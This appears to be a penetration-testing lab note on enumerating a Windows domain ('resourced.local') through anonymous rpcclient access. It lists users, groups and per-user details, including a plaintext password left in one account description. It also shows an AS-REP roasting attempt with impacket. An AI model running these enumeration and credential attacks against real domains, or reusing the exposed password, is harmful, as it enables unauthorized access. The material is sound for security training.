# rpcclient

Test anonymous access
```
rpcclient -U "" -N $IP
```

Success -- let's enumerate further:

`impacket-rpcdump $IP > rpcdump.txt`

Total output has 1159 lines.

Now that we have this saved, I'll do some manual enumeration for greater control:

`rpcclient -U "" -N $IP`

## User Enumeration

`enumdomusers`

(enumdomusers.txt)
```
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[M.Mason] rid:[0x44f]
user:[K.Keen] rid:[0x450]
user:[L.Livingstone] rid:[0x451]
user:[J.Johnson] rid:[0x452]
user:[V.Ventz] rid:[0x453]
user:[S.Swanson] rid:[0x454]
user:[P.Parker] rid:[0x455]
user:[R.Robinson] rid:[0x456]
user:[D.Durant] rid:[0x457]
user:[G.Goldberg] rid:[0x458]
```

Clean list (users.txt)
`cat enumdomusers.txt| awk -F'[][]' '{print $2}' > users.txt`
```
Administrator
Guest
krbtgt
M.Mason
K.Keen
L.Livingstone
J.Johnson
V.Ventz
S.Swanson
P.Parker
R.Robinson
D.Durant
G.Goldberg
```

This gives us a list of users that we might use to brute force or password spray. The Guest users is a good indicator that we might be able to gain more access through SMB or RDP.

Let's gather more info on each with `queryuser`:

### Administrator
```
User Name   :   Administrator
Full Name   :
Home Drive  :
Dir Drive   :
Profile Path:
Logon Script:
Description :   Built-in account for administering the computer/domain
Workstations:
Comment     :
Remote Dial :
Logon Time               :      Fri, 08 Aug 2025 08:21:34 PDT
Logoff Time              :      Wed, 31 Dec 1969 16:00:00 PST
Kickoff Time             :      Wed, 31 Dec 1969 16:00:00 PST
Password last set Time   :      Fri, 11 Feb 2022 09:21:21 PST
Password can change Time :      Sat, 12 Feb 2022 09:21:21 PST
Password must change Time:      Wed, 13 Sep 30828 19:48:05 PDT
unknown_2[0..31]...
user_rid :      0x1f4
group_rid:      0x201
acb_info :      0x00000210
fields_present: 0x00ffffff
logon_divs:     168
bad_password_count:     0x00000000
logon_count:    0x00000035
padding1[0..7]...
logon_hrs[0..21]...
```

### Guest
```
User Name   :   Guest
Full Name   :
Home Drive  :
Dir Drive   :
Profile Path:
Logon Script:
Description :   Built-in account for guest access to the computer/domain
Workstations:
Comment     :
Remote Dial :
Logon Time               :      Wed, 31 Dec 1969 16:00:00 PST
Logoff Time              :      Wed, 31 Dec 1969 16:00:00 PST
Kickoff Time             :      Wed, 13 Sep 30828 19:48:05 PDT
Password last set Time   :      Wed, 31 Dec 1969 16:00:00 PST
Password can change Time :      Wed, 31 Dec 1969 16:00:00 PST
Password must change Time:      Wed, 13 Sep 30828 19:48:05 PDT
unknown_2[0..31]...
user_rid :      0x1f5
group_rid:      0x202
acb_info :      0x00000215
fields_present: 0x00ffffff
logon_divs:     168
bad_password_count:     0x00000000
logon_count:    0x00000000
padding1[0..7]...
logon_hrs[0..21]...
```

### krbtgt
```
User Name   :   krbtgt
Full Name   :
Home Drive  :
Dir Drive   :
Profile Path:
Logon Script:
Description :   Key Distribution Center Service Account
Workstations:
Comment     :
Remote Dial :
Logon Time               :      Wed, 31 Dec 1969 16:00:00 PST
Logoff Time              :      Wed, 31 Dec 1969 16:00:00 PST
Kickoff Time             :      Wed, 13 Sep 30828 19:48:05 PDT
Password last set Time   :      Fri, 01 Oct 2021 04:08:53 PDT
Password can change Time :      Sat, 02 Oct 2021 04:08:53 PDT
Password must change Time:      Fri, 12 Nov 2021 03:08:53 PST
unknown_2[0..31]...
user_rid :      0x1f6
group_rid:      0x201
acb_info :      0x00020011
fields_present: 0x00ffffff
logon_divs:     168
bad_password_count:     0x00000000
logon_count:    0x00000000
padding1[0..7]...
logon_hrs[0..21]...
```

### M.Mason
```
User Name   :   M.Mason
Full Name   :
Home Drive  :
Dir Drive   :
Profile Path:
Logon Script:
Description :   Ex IT admin
Workstations:
Comment     :
Remote Dial :
Logon Time               :      Wed, 31 Dec 1969 16:00:00 PST
Logoff Time              :      Wed, 31 Dec 1969 16:00:00 PST
Kickoff Time             :      Wed, 13 Sep 30828 19:48:05 PDT
Password last set Time   :      Fri, 01 Oct 2021 04:14:52 PDT
Password can change Time :      Sat, 02 Oct 2021 04:14:52 PDT
Password must change Time:      Fri, 12 Nov 2021 03:14:52 PST
unknown_2[0..31]...
user_rid :      0x44f
group_rid:      0x201
acb_info :      0x00020010
fields_present: 0x00ffffff
logon_divs:     168
bad_password_count:     0x00000000
logon_count:    0x00000000
padding1[0..7]...
logon_hrs[0..21]...
```

### K.Keen
```
User Name   :   K.Keen
Full Name   :
Home Drive  :
Dir Drive   :
Profile Path:
Logon Script:
Description :   Frontend Developer
Workstations:
Comment     :
Remote Dial :
Logon Time               :      Wed, 31 Dec 1969 16:00:00 PST
Logoff Time              :      Wed, 31 Dec 1969 16:00:00 PST
Kickoff Time             :      Wed, 13 Sep 30828 19:48:05 PDT
Password last set Time   :      Fri, 01 Oct 2021 04:14:52 PDT
Password can change Time :      Sat, 02 Oct 2021 04:14:52 PDT
Password must change Time:      Fri, 12 Nov 2021 03:14:52 PST
unknown_2[0..31]...
user_rid :      0x450
group_rid:      0x201
acb_info :      0x00020010
fields_present: 0x00ffffff
logon_divs:     168
bad_password_count:     0x00000000
logon_count:    0x00000000
padding1[0..7]...
logon_hrs[0..21]...
```

### L.Livingstone
```
User Name   :   L.Livingstone
Full Name   :
Home Drive  :
Dir Drive   :
Profile Path:
Logon Script:
Description :   SysAdmin
Workstations:
Comment     :
Remote Dial :
Logon Time               :      Fri, 01 Oct 2021 04:15:03 PDT
Logoff Time              :      Wed, 31 Dec 1969 16:00:00 PST
Kickoff Time             :      Wed, 13 Sep 30828 19:48:05 PDT
Password last set Time   :      Fri, 01 Oct 2021 04:14:52 PDT
Password can change Time :      Sat, 02 Oct 2021 04:14:52 PDT
Password must change Time:      Wed, 13 Sep 30828 19:48:05 PDT
unknown_2[0..31]...
user_rid :      0x451
group_rid:      0x201
acb_info :      0x00000210
fields_present: 0x00ffffff
logon_divs:     168
bad_password_count:     0x00000000
logon_count:    0x00000001
padding1[0..7]...
logon_hrs[0..21]...
```

### J.Johnson
```
User Name   :   J.Johnson
Full Name   :
Home Drive  :
Dir Drive   :
Profile Path:
Logon Script:
Description :   Networking specialist
Workstations:
Comment     :
Remote Dial :
Logon Time               :      Wed, 31 Dec 1969 16:00:00 PST
Logoff Time              :      Wed, 31 Dec 1969 16:00:00 PST
Kickoff Time             :      Wed, 13 Sep 30828 19:48:05 PDT
Password last set Time   :      Fri, 01 Oct 2021 04:14:52 PDT
Password can change Time :      Sat, 02 Oct 2021 04:14:52 PDT
Password must change Time:      Fri, 12 Nov 2021 03:14:52 PST
unknown_2[0..31]...
user_rid :      0x452
group_rid:      0x201
acb_info :      0x00020010
fields_present: 0x00ffffff
logon_divs:     168
bad_password_count:     0x00000000
logon_count:    0x00000000
padding1[0..7]...
logon_hrs[0..21]...
```

### V.Ventz
```
User Name   :   V.Ventz
Full Name   :
Home Drive  :
Dir Drive   :
Profile Path:
Logon Script:
Description :   New-hired, reminder: HotelCalifornia194!
Workstations:
Comment     :
Remote Dial :
Logon Time               :      Wed, 31 Dec 1969 16:00:00 PST
Logoff Time              :      Wed, 31 Dec 1969 16:00:00 PST
Kickoff Time             :      Wed, 13 Sep 30828 19:48:05 PDT
Password last set Time   :      Fri, 01 Oct 2021 04:14:52 PDT
Password can change Time :      Sat, 02 Oct 2021 04:14:52 PDT
Password must change Time:      Wed, 13 Sep 30828 19:48:05 PDT
unknown_2[0..31]...
user_rid :      0x453
group_rid:      0x201
acb_info :      0x00000210
fields_present: 0x00ffffff
logon_divs:     168
bad_password_count:     0x00000000
logon_count:    0x00000000
padding1[0..7]...
logon_hrs[0..21]...
```

## S.Swanson
```
User Name   :   S.Swanson
Full Name   :
Home Drive  :
Dir Drive   :
Profile Path:
Logon Script:
Description :   Military Vet now cybersecurity specialist
Workstations:
Comment     :
Remote Dial :
Logon Time               :      Wed, 31 Dec 1969 16:00:00 PST
Logoff Time              :      Wed, 31 Dec 1969 16:00:00 PST
Kickoff Time             :      Wed, 13 Sep 30828 19:48:05 PDT
Password last set Time   :      Fri, 01 Oct 2021 04:14:52 PDT
Password can change Time :      Sat, 02 Oct 2021 04:14:52 PDT
Password must change Time:      Fri, 12 Nov 2021 03:14:52 PST
unknown_2[0..31]...
user_rid :      0x454
group_rid:      0x201
acb_info :      0x00020010
fields_present: 0x00ffffff
logon_divs:     168
bad_password_count:     0x00000000
logon_count:    0x00000000
padding1[0..7]...
logon_hrs[0..21]...
```

### P.Parker
```
User Name   :   P.Parker
Full Name   :
Home Drive  :
Dir Drive   :
Profile Path:
Logon Script:
Description :   Backend Developer
Workstations:
Comment     :
Remote Dial :
Logon Time               :      Wed, 31 Dec 1969 16:00:00 PST
Logoff Time              :      Wed, 31 Dec 1969 16:00:00 PST
Kickoff Time             :      Wed, 13 Sep 30828 19:48:05 PDT
Password last set Time   :      Fri, 01 Oct 2021 04:14:52 PDT
Password can change Time :      Sat, 02 Oct 2021 04:14:52 PDT
Password must change Time:      Fri, 12 Nov 2021 03:14:52 PST
unknown_2[0..31]...
user_rid :      0x455
group_rid:      0x201
acb_info :      0x00020010
fields_present: 0x00ffffff
logon_divs:     168
bad_password_count:     0x00000000
logon_count:    0x00000000
padding1[0..7]...
logon_hrs[0..21]...
```

### R.Robinson
```
User Name   :   R.Robinson
Full Name   :
Home Drive  :
Dir Drive   :
Profile Path:
Logon Script:
Description :   Database Admin
Workstations:
Comment     :
Remote Dial :
Logon Time               :      Wed, 31 Dec 1969 16:00:00 PST
Logoff Time              :      Wed, 31 Dec 1969 16:00:00 PST
Kickoff Time             :      Wed, 13 Sep 30828 19:48:05 PDT
Password last set Time   :      Fri, 01 Oct 2021 04:14:52 PDT
Password can change Time :      Sat, 02 Oct 2021 04:14:52 PDT
Password must change Time:      Fri, 12 Nov 2021 03:14:52 PST
unknown_2[0..31]...
user_rid :      0x456
group_rid:      0x201
acb_info :      0x00020010
fields_present: 0x00ffffff
logon_divs:     168
bad_password_count:     0x00000000
logon_count:    0x00000000
padding1[0..7]...
logon_hrs[0..21]...
```

### D.Durant
```
User Name   :   D.Durant
Full Name   :
Home Drive  :
Dir Drive   :
Profile Path:
Logon Script:
Description :   Linear Algebra and crypto god
Workstations:
Comment     :
Remote Dial :
Logon Time               :      Wed, 31 Dec 1969 16:00:00 PST
Logoff Time              :      Wed, 31 Dec 1969 16:00:00 PST
Kickoff Time             :      Wed, 13 Sep 30828 19:48:05 PDT
Password last set Time   :      Fri, 01 Oct 2021 04:14:53 PDT
Password can change Time :      Sat, 02 Oct 2021 04:14:53 PDT
Password must change Time:      Fri, 12 Nov 2021 03:14:53 PST
unknown_2[0..31]...
user_rid :      0x457
group_rid:      0x201
acb_info :      0x00020010
fields_present: 0x00ffffff
logon_divs:     168
bad_password_count:     0x00000000
logon_count:    0x00000000
padding1[0..7]...
logon_hrs[0..21]...
```

### G.Goldberg
```
User Name   :   G.Goldberg
Full Name   :
Home Drive  :
Dir Drive   :
Profile Path:
Logon Script:
Description :   Blockchain expert
Workstations:
Comment     :
Remote Dial :
Logon Time               :      Wed, 31 Dec 1969 16:00:00 PST
Logoff Time              :      Wed, 31 Dec 1969 16:00:00 PST
Kickoff Time             :      Wed, 13 Sep 30828 19:48:05 PDT
Password last set Time   :      Fri, 01 Oct 2021 04:14:53 PDT
Password can change Time :      Sat, 02 Oct 2021 04:14:53 PDT
Password must change Time:      Fri, 12 Nov 2021 03:14:53 PST
unknown_2[0..31]...
user_rid :      0x458
group_rid:      0x201
acb_info :      0x00020010
fields_present: 0x00ffffff
logon_divs:     168
bad_password_count:     0x00000000
logon_count:    0x00000000
padding1[0..7]...
logon_hrs[0..21]...
```

---

`srvinfo` (access denied)

`enumdomgroups`

```
group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
group:[Domain Admins] rid:[0x200]
group:[Domain Users] rid:[0x201]
group:[Domain Guests] rid:[0x202]
group:[Domain Computers] rid:[0x203]
group:[Domain Controllers] rid:[0x204]
group:[Schema Admins] rid:[0x206]
group:[Enterprise Admins] rid:[0x207]
group:[Group Policy Creator Owners] rid:[0x208]
group:[Read-only Domain Controllers] rid:[0x209]
group:[Cloneable Domain Controllers] rid:[0x20a]
group:[Protected Users] rid:[0x20d]
group:[Key Admins] rid:[0x20e]
group:[Enterprise Key Admins] rid:[0x20f]
group:[DnsUpdateProxy] rid:[0x44e]
```

## Share Enumeration
`netshareenumall`

No access.

# AS-REP Roasting

`impacket-GetNPUsers resourced.local/ -usersfile users.txt -no-pass -dc-ip $IP`

```
[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User M.Mason doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User K.Keen doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User L.Livingstone doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User J.Johnson doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User V.Ventz doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User S.Swanson doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User P.Parker doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User R.Robinson doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User D.Durant doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User G.Goldberg doesn't have UF_DONT_REQUIRE_PREAUTH set
```

No accounts are vulnerable to AS-REP roasting.

I'll look into SMB next.
# Continue: [[139,445 SMB|139,445 SMB]]
